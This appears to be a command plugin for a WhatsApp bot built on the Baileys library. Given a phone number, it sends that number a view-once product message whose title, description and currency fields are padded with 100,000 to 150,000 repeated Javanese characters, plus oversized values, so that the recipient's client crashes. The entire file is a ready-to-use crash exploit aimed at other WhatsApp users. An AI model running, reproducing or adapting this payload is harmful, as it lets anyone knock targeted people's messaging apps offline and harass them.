const { cmd } = require('../command');
const { proto } = require('@adiwajshing/baileys');

cmd({
    pattern: "hard-bug",
    alias: ["crash", "bug"],
    use: ".bug2",
    desc: "Send a powerful crash payload to a target JID",
    category: "utility",
    react: "💀",
    filename: __filename
},
async (conn, mek, m, { from, quoted, body, isCmd, command, args, q, sender, reply, generateWAMessageFromContent }) => {
    try {
        // React to command
        await conn.sendMessage(sender, { react: { text: '⚠️', key: mek.key } });

        // Extract query
        const query = q || body?.split(' ').slice(1).join(' ') || args?.join(' ') || '';
        if (!query.trim()) {
            return await conn.sendMessage(from, {
                text: "❎ Please provide a target JID or number.\n\n*Example:* .bug2 123456789\n*Example:* .bug2 123456789@s.whatsapp.net"
            }, { quoted: mek });
        }

        // Clean and format target
        const cleanQuery = query.trim().replace(/[^0-9@.]/g, '');
        const target = cleanQuery.includes("@") ? cleanQuery : `${cleanQuery}@s.whatsapp.net`;

        // Validate JID format
        if (!target.match(/^\d+@s\.whatsapp\.net$|^\d+@\w+\.whatsapp\.net$/)) {
            return await conn.sendMessage(from, {
                text: "❌ Invalid JID format. Please use a valid number or JID.\n*Example:* 123456789@s.whatsapp.net"
            }, { quoted: mek });
        }

        // Check generateWAMessageFromContent
        if (typeof generateWAMessageFromContent !== "function") {
            return await conn.sendMessage(from, {
                text: "❌ generateWAMessageFromContent function not available in this bot version."
            }, { quoted: mek });
        }

        // Original crash payload (unchanged)
        const crashPayload = {
            viewOnceMessage: {
                message: {
                    productMessage: {
                        product: {
                            productImage: {
                                url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m237/up-oil-image-6a66c589-1ed7-4831-9ff7-a537aeec42e5?ccb=9-4&oh=01_Q5AaIO-QEENiH3ITkuP8eDd60OuxvNiUaeZsPjnEfSNbf_lx&oe=6761488D&_nc_sid=e6ed6c&mms3=true",
                                mimetype: "image/jpeg",
                                fileSha256: "4euJQxdTEpk2NS0R7QK6MjGhcix+h1Evxcrrmj1u9nM=",
                                fileLength: "9999999",
                                height: 1080,
                                width: 1080,
                                mediaKey: "e/5eEYHPLtzZAXLn9cBR8M3+w0bvdFsBvoSf9EPy75w=",
                                fileEncSha256: "/UO6fl07VoTDsXv1W9zqYAS+pBUz6HVokpl4r84LuOg=",
                                directPath: "/o1/v/t62.7118-24/f1/m237/up-oil-image-6a66c589-1ed7-4831-9ff7-a537aeec42e5?ccb=9-4&oh=01_Q5AaIO-QEENiH3ITkuP8eDd60OuxvNiUaeZsPjnEfSNbf_lx&oe=6761488D&_nc_sid=e6ed6c",
                                mediaKeyTimestamp: "1731847042",
                                jpegThumbnail: null
                            },
                            productId: "28364464939807272",
                            title: "💀 CRASH SYSTEM " + "ꦾ".repeat(150000),
                            description: "⚡ POWERED BY SABIR7718 " + "ꦾ".repeat(150000),
                            currencyCode: "💥" + "ꦾ".repeat(100000),
                            priceAmount1000: "999999999999999",
                            productImageCount: 999
                        },
                        businessOwnerJid: "0@s.whatsapp.net",
                        contextInfo: {
                            expiration: 999999,
                            mentionedJid: [target]
                        }
                    }
                }
            }
        };

        // Generate message
        const atc = generateWAMessageFromContent(target, proto.Message.fromObject(crashPayload), { userJid: target });

        // Send message with timeout protection
        await Promise.race([
            conn.relayMessage(target, atc.message, { participant: target, messageId: atc.key.id }),
            new Promise((_, reject) => setTimeout(() => reject(new Error("Timeout - Message not delivered")), 10000))
        ]);

        // Success confirmation
        await conn.sendMessage(sender, {
            text: `✅ Bug2 successfully sent to ${target}\n📱 System crash activated`
        }, { quoted: mek });

        console.log(`💀 Crash System deployed to ${target} - ${new Date().toLocaleString()}`);

    } catch (error) {
        console.error("❌ Failed to send Bug2:", error);
        reply(`⚠️ Failed to send Bug2:\n${error.message}\n\nPlease check target JID and try again.`);
    }
});
